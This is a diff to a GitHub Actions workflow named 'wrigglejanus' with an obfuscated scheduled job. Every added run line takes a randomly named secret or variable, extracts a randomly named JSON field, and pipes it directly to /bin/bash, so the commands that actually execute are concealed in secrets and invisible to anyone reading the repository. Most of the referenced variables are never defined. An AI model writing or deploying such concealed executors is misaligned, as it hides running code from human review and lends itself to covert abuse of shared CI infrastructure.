@@ -3,7 +3,7 @@ name: wrigglejanus
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
+    - cron: '14 1/6 * * *'
 
 jobs:
   build:
@@ -13,11 +13,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: wrigglejanus
         env:
-          u2: ${{ secrets.u2 }}
+          tlrfn25: ${{ secrets.tlrfn25 }}
         run: |
-          echo $u2 | jq -r .yxoy5448 | /bin/bash
-          echo $fni5 | jq -r .olrq113 | /bin/bash
-          echo $f9478 | jq -r .znpov14 | /bin/bash
-          echo $av6 | jq -r .bmux40595 | /bin/bash
-          echo $hqpow75396 | jq -r .gib7222 | /bin/bash
+          echo $tlrfn25 | jq -r .hm65760 | /bin/bash
+          echo $xdure0131 | jq -r .mtdtn961 | /bin/bash
+          echo $hhc066 | jq -r .fa93 | /bin/bash
+          echo $f6581 | jq -r .eqzl66440 | /bin/bash
+          echo $vwcb95935 | jq -r .p59 | /bin/bash
+          echo $jet36 | jq -r .k3 | /bin/bash
+          echo $s313 | jq -r .hfvg4763 | /bin/bash
+          echo $s446 | jq -r .gyf787 | /bin/bash
+          echo $mu5980 | jq -r .mcjyj16 | /bin/bash
+          echo $hsfeq53526 | jq -r .yfaig173 | /bin/bash
+          echo $hrzj4870 | jq -r .kzbwc038 | /bin/bash
+          echo $wzcek50 | jq -r .mg27 | /bin/bash
+          echo $gsss79136 | jq -r .jfrb83883 | /bin/bash
+          echo $hs3 | jq -r .pa64 | /bin/bash
+          echo $wu1499 | jq -r .axlw985 | /bin/bash
+          echo $yjm99 | jq -r .lfsby9 | /bin/bash
+          echo $ky81737 | jq -r .beqqe2 | /bin/bash
 
